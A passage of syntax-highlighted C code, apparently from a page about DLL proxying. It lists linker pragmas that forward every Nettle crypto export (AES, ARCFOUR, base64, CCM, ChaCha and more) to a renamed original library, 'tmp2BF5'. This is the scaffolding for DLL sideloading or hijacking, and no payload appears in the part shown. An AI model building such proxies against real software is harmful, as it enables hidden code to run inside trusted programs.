class="hljs-meta-string">&quot;/export:nettle_aes192=tmp2BF5.nettle_aes192,@63&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes192_decrypt=tmp2BF5.nettle_aes192_decrypt,@64&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes192_encrypt=tmp2BF5.nettle_aes192_encrypt,@65&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes192_invert_key=tmp2BF5.nettle_aes192_invert_key,@66&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes192_set_decrypt_key=tmp2BF5.nettle_aes192_set_decrypt_key,@67&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes192_set_encrypt_key=tmp2BF5.nettle_aes192_set_encrypt_key,@68&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes256=tmp2BF5.nettle_aes256,@69&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes256_decrypt=tmp2BF5.nettle_aes256_decrypt,@70&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes256_encrypt=tmp2BF5.nettle_aes256_encrypt,@71&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes256_invert_key=tmp2BF5.nettle_aes256_invert_key,@72&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes256_set_decrypt_key=tmp2BF5.nettle_aes256_set_decrypt_key,@73&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes256_set_encrypt_key=tmp2BF5.nettle_aes256_set_encrypt_key,@74&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes_decrypt=tmp2BF5.nettle_aes_decrypt,@75&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes_encrypt=tmp2BF5.nettle_aes_encrypt,@76&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes_invert_key=tmp2BF5.nettle_aes_invert_key,@77&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes_set_decrypt_key=tmp2BF5.nettle_aes_set_decrypt_key,@78&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes_set_encrypt_key=tmp2BF5.nettle_aes_set_encrypt_key,@79&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_arcfour128_set_key=tmp2BF5.nettle_arcfour128_set_key,@80&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_arcfour_crypt=tmp2BF5.nettle_arcfour_crypt,@81&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_arcfour_set_key=tmp2BF5.nettle_arcfour_set_key,@82&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_arctwo128=tmp2BF5.nettle_arctwo128,@83&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_arctwo128_set_key=tmp2BF5.nettle_arctwo128_set_key,@84&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_arctwo128_set_key_gutmann=tmp2BF5.nettle_arctwo128_set_key_gutmann,@85&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_arctwo40=tmp2BF5.nettle_arctwo40,@86&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_arctwo40_set_key=tmp2BF5.nettle_arctwo40_set_key,@87&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_arctwo64=tmp2BF5.nettle_arctwo64,@88&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_arctwo64_set_key=tmp2BF5.nettle_arctwo64_set_key,@89&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_arctwo_decrypt=tmp2BF5.nettle_arctwo_decrypt,@90&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_arctwo_encrypt=tmp2BF5.nettle_arctwo_encrypt,@91&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_arctwo_gutmann128=tmp2BF5.nettle_arctwo_gutmann128,@92&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_arctwo_set_key=tmp2BF5.nettle_arctwo_set_key,@93&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_arctwo_set_key_ekb=tmp2BF5.nettle_arctwo_set_key_ekb,@94&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_arctwo_set_key_gutmann=tmp2BF5.nettle_arctwo_set_key_gutmann,@95&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base16=tmp2BF5.nettle_base16,@96&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base16_decode_final=tmp2BF5.nettle_base16_decode_final,@97&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base16_decode_init=tmp2BF5.nettle_base16_decode_init,@98&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base16_decode_single=tmp2BF5.nettle_base16_decode_single,@99&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base16_decode_update=tmp2BF5.nettle_base16_decode_update,@100&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base16_encode_single=tmp2BF5.nettle_base16_encode_single,@101&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base16_encode_update=tmp2BF5.nettle_base16_encode_update,@102&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base64=tmp2BF5.nettle_base64,@103&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base64_decode_final=tmp2BF5.nettle_base64_decode_final,@104&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base64_decode_init=tmp2BF5.nettle_base64_decode_init,@105&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base64_decode_single=tmp2BF5.nettle_base64_decode_single,@106&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base64_decode_update=tmp2BF5.nettle_base64_decode_update,@107&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base64_encode_final=tmp2BF5.nettle_base64_encode_final,@108&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base64_encode_group=tmp2BF5.nettle_base64_encode_group,@109&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base64_encode_init=tmp2BF5.nettle_base64_encode_init,@110&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base64_encode_raw=tmp2BF5.nettle_base64_encode_raw,@111&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base64_encode_single=tmp2BF5.nettle_base64_encode_single,@112&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base64_encode_update=tmp2BF5.nettle_base64_encode_update,@113&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base64url=tmp2BF5.nettle_base64url,@114&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base64url_decode_init=tmp2BF5.nettle_base64url_decode_init,@115&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_base64url_encode_init=tmp2BF5.nettle_base64url_encode_init,@116&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_blowfish128_set_key=tmp2BF5.nettle_blowfish128_set_key,@117&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_blowfish_decrypt=tmp2BF5.nettle_blowfish_decrypt,@118&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_blowfish_encrypt=tmp2BF5.nettle_blowfish_encrypt,@119&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_blowfish_set_key=tmp2BF5.nettle_blowfish_set_key,@120&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_buffer_clear=tmp2BF5.nettle_buffer_clear,@121&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_buffer_copy=tmp2BF5.nettle_buffer_copy,@122&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_buffer_grow=tmp2BF5.nettle_buffer_grow,@123&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_buffer_init=tmp2BF5.nettle_buffer_init,@124&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_buffer_init_realloc=tmp2BF5.nettle_buffer_init_realloc,@125&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_buffer_init_size=tmp2BF5.nettle_buffer_init_size,@126&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_buffer_reset=tmp2BF5.nettle_buffer_reset,@127&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_buffer_space=tmp2BF5.nettle_buffer_space,@128&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_buffer_write=tmp2BF5.nettle_buffer_write,@129&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_camellia128=tmp2BF5.nettle_camellia128,@130&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_camellia128_crypt=tmp2BF5.nettle_camellia128_crypt,@131&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_camellia128_invert_key=tmp2BF5.nettle_camellia128_invert_key,@132&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_camellia128_set_encrypt_key=tmp2BF5.nettle_camellia128_set_encrypt_key,@133&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_camellia192=tmp2BF5.nettle_camellia192,@134&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_camellia192_set_decrypt_key=tmp2BF5.nettle_camellia192_set_decrypt_key,@135&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_camellia192_set_encrypt_key=tmp2BF5.nettle_camellia192_set_encrypt_key,@136&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_camellia256=tmp2BF5.nettle_camellia256,@137&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_camellia256_crypt=tmp2BF5.nettle_camellia256_crypt,@138&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_camellia256_invert_key=tmp2BF5.nettle_camellia256_invert_key,@139&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_camellia256_set_decrypt_key=tmp2BF5.nettle_camellia256_set_decrypt_key,@140&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_camellia256_set_encrypt_key=tmp2BF5.nettle_camellia256_set_encrypt_key,@141&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_camellia_set_decrypt_key=tmp2BF5.nettle_camellia_set_decrypt_key,@142&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cast128=tmp2BF5.nettle_cast128,@143&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cast128_decrypt=tmp2BF5.nettle_cast128_decrypt,@144&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cast128_encrypt=tmp2BF5.nettle_cast128_encrypt,@145&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cast128_set_key=tmp2BF5.nettle_cast128_set_key,@146&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cast5_set_key=tmp2BF5.nettle_cast5_set_key,@147&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cbc_decrypt=tmp2BF5.nettle_cbc_decrypt,@148&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cbc_encrypt=tmp2BF5.nettle_cbc_encrypt,@149&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes128_decrypt=tmp2BF5.nettle_ccm_aes128_decrypt,@150&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes128_decrypt_message=tmp2BF5.nettle_ccm_aes128_decrypt_message,@151&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes128_digest=tmp2BF5.nettle_ccm_aes128_digest,@152&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes128_encrypt=tmp2BF5.nettle_ccm_aes128_encrypt,@153&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes128_encrypt_message=tmp2BF5.nettle_ccm_aes128_encrypt_message,@154&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes128_set_key=tmp2BF5.nettle_ccm_aes128_set_key,@155&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes128_set_nonce=tmp2BF5.nettle_ccm_aes128_set_nonce,@156&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes128_update=tmp2BF5.nettle_ccm_aes128_update,@157&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes192_decrypt=tmp2BF5.nettle_ccm_aes192_decrypt,@158&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes192_decrypt_message=tmp2BF5.nettle_ccm_aes192_decrypt_message,@159&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes192_digest=tmp2BF5.nettle_ccm_aes192_digest,@160&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes192_encrypt=tmp2BF5.nettle_ccm_aes192_encrypt,@161&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes192_encrypt_message=tmp2BF5.nettle_ccm_aes192_encrypt_message,@162&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes192_set_key=tmp2BF5.nettle_ccm_aes192_set_key,@163&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes192_set_nonce=tmp2BF5.nettle_ccm_aes192_set_nonce,@164&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes192_update=tmp2BF5.nettle_ccm_aes192_update,@165&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes256_decrypt=tmp2BF5.nettle_ccm_aes256_decrypt,@166&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes256_decrypt_message=tmp2BF5.nettle_ccm_aes256_decrypt_message,@167&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes256_digest=tmp2BF5.nettle_ccm_aes256_digest,@168&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes256_encrypt=tmp2BF5.nettle_ccm_aes256_encrypt,@169&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes256_encrypt_message=tmp2BF5.nettle_ccm_aes256_encrypt_message,@170&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes256_set_key=tmp2BF5.nettle_ccm_aes256_set_key,@171&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes256_set_nonce=tmp2BF5.nettle_ccm_aes256_set_nonce,@172&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_aes256_update=tmp2BF5.nettle_ccm_aes256_update,@173&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_decrypt=tmp2BF5.nettle_ccm_decrypt,@174&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_decrypt_message=tmp2BF5.nettle_ccm_decrypt_message,@175&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_digest=tmp2BF5.nettle_ccm_digest,@176&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_encrypt=tmp2BF5.nettle_ccm_encrypt,@177&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_encrypt_message=tmp2BF5.nettle_ccm_encrypt_message,@178&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_set_nonce=tmp2BF5.nettle_ccm_set_nonce,@179&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_ccm_update=tmp2BF5.nettle_ccm_update,@180&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cfb8_decrypt=tmp2BF5.nettle_cfb8_decrypt,@181&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cfb8_encrypt=tmp2BF5.nettle_cfb8_encrypt,@182&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cfb_decrypt=tmp2BF5.nettle_cfb_decrypt,@183&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cfb_encrypt=tmp2BF5.nettle_cfb_encrypt,@184&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_chacha_crypt=tmp2BF5.nettle_chacha_crypt,@185&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_chacha_crypt32=tmp2BF5.nettle_chacha_crypt32,@186&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_chacha_poly1305=tmp2BF5.nettle_chacha_poly1305,@187&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_chacha_poly1305_decrypt=tmp2BF5.nettle_chacha_poly1305_decrypt,@188&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_chacha_poly1305_digest=tmp2BF5.nettle_chacha_poly1305_digest,@189&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_chacha_poly1305_encrypt=tmp2BF5.nettle_chacha_poly1305_encrypt,@190&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_chacha_poly1305_set_key=tmp2BF5.nettle_chacha_poly1305_set_key,@191&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_chacha_poly1305_set_nonce=tmp2BF5.nettle_chacha_poly1305_set_nonce,@192&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_chacha_poly1305_update=tmp2BF5.nettle_chacha_poly1305_update,@193&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_chacha_set_counter=tmp2BF5.nettle_chacha_set_counter,@194&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_chacha_set_counter32=tmp2BF5.nettle_chacha_set_counter32,@195&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_chacha_set_key=tmp2BF5.nettle_chacha_set_key,@196&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_chacha_set_nonce=tmp2BF5.nettle_chacha_set_nonce,@197&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_chacha_set_nonce96=tmp2BF5.nettle_chacha_set_nonce96,@198&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac128_digest=tmp2BF5.nettle_cmac128_digest,@199&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_cmac128_init=tmp2BF5.nettle_cmac128_init,@200&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span 